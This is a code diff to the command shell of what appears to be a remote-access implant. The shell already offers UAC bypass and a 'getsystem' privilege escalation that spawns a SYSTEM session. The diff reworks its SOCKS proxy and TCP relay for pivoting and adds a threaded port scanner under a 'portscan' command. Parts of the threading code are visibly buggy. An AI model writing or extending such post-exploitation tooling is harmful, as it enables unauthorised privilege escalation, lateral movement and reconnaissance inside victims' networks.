@@ -164,15 +164,23 @@ class Shell:
 		return "|".join([f for f in os.listdir('.') if os.path.isfile(f) and f.startswith(text)])
 		
 	def socks_proxy_thread(self):
-		reactor.listenTCP(2080,socks.SOCKSv4Factory())
+		t = threading.currentThread()
 		reactor.run()
 		
 	def start_socks_proxy(self):
-		t = StoppableThread(target=self.socks_proxy_thread)
+		reactor.listenTCP(2080,socks.SOCKSv4Factory(""))
+		t = threading.Thread(target=self.socks_proxy_thread)
 		t.daemon = True
 		t.start()
-		self.threads.append(t)
-		
+		t = threading.currentThread()
+		while True:	
+			time.sleep(1)
+			if t.stopped():
+				reactor.callFromThread(reactor.stop)
+				reactor.callInThread(reactor.stop)
+				reactor.stop()
+				break
+				
 	def tcp_relay(self):
 		current_thread = threading.currentThread()
 		while not current_thread.stopped():
@@ -211,17 +219,24 @@ class Shell:
 			remote_socket.close()
 					
 	def create_tcp_relay(self):
-		self.start_socks_proxy()
-		t = StoppableThread(target=self.tcp_relay)
-		t.daemon = True
-		t.start()
-		self.threads.append(t)
-		return "ok"
+		try:
+			t = StoppableThread(self.start_socks_proxy)
+			t.daemon = True
+			t.start()
+			self.threads.append(t)
+			t = StoppableThread(target=self.tcp_relay)
+			t.daemon = True
+			t.start()
+			self.threads.append(t)
+			return "Proxy started. WARNING: Due to the nature of Twisted, you can't restart the proxy after stopping it. Make sure you won't need the proxy before stopping it!"
+		except:
+			return "Failed to start proxy."
 		
 	def stop_tcp_relay(self):
 		for t in self.threads:
 			t.stop()
-		return "[*] Stopped"
+			del t
+		return "Proxy stopped."
 		
 	def is_admin(self):
 		if os.name == "nt":
@@ -268,8 +283,84 @@ class Shell:
 		try:
 			pupy_privesc.getsystem(os.path.abspath(sys.executable))
 		except Exception as e:
-			return "Failed, try again. "+str(e)
+			return "getsystem failed: "+str(e)
 		return "A new session with SYSTEM privileges should appear in the next 30 seconds."
+		
+	def scan_host(self, host, ports, q):
+		random.shuffle(ports)
+		for port in ports:
+			try:
+				s = socket.socket()
+				s.settimeout(0.5)
+				print "trying "+host+" "+str(port)
+				s.connect((host, port))
+				q.put((host, port))
+			except:
+				continue
+		
+	def portscan(self, hosts, ports):
+		q = Queue.Queue()
+		host_list = []
+		port_list = []
+		for i in ports.split(","):
+			try:
+				if '-' not in i:
+					port_list.append(i)
+				else:
+					a, b = map(int, i.split('-'))
+					port_list += range(a, b+1)
+			except:
+				return "Invalid port range"
+				
+		if not port_list or port_list[0] == []:
+			return "Invalid port range"
+				
+		host_range = ".".join(hosts.split(".")[:3])
+		try:
+			for i in hosts.split(","):
+				print i
+				print hosts.split(".")
+				if '-' not in i.split(".")[3]:
+					host_list.append(host_range+"."+str(i.split(".")[3]))
+				else:
+					a, b = map(int, i.split(".")[3].split('-'))
+					for c in range(a, b+1):
+						host_list.append(host_range+"."+str(c))
+		except Exception as e:
+			return "Invalid host range"
+			
+		if not host_list or host_list[0] == []:
+			return "Invalid host range"
+				
+		threads = []
+		for host in host_list:
+			t = threading.Thread(target=self.scan_host, args=(host, port_list, q))
+			t.daemon = True
+			t.start()
+			threads.append(t)
+			
+		for t in threads:
+			t.join()
+			
+		open = []
+		while not q.empty():
+			open.append(q.get())
+			
+		hosts = {}
+		for host, port in open:
+			if host not in hosts:
+				hosts[host] = str(port)
+			else:
+				hosts[host] += ","+str(port)
+			
+		out = ""
+		for host in hosts:
+			out += host+":\n"
+			for port in sorted(hosts[host].split(",")):
+				out += "  "+str(port)+" OPEN\n"
+			out += "\n"
+			
+		return out
 					
 	def handle_command(self, data):
 		command = data.split()[0]
@@ -308,6 +399,13 @@ class Shell:
 			output = self.bypass_uac()
 		elif command == "getsystem":
 			output = self.get_system()
+		elif command == "portscan":
+			try:
+				hosts, ports = arguments.split()
+				output = self.portscan(hosts, ports)
+			except Exception as e:
+				print e
+				output = "usage: portscan [host_range] [port_range]"
 		elif command == "die":
 			self.comm_socket.close()
 			os._exit(0)
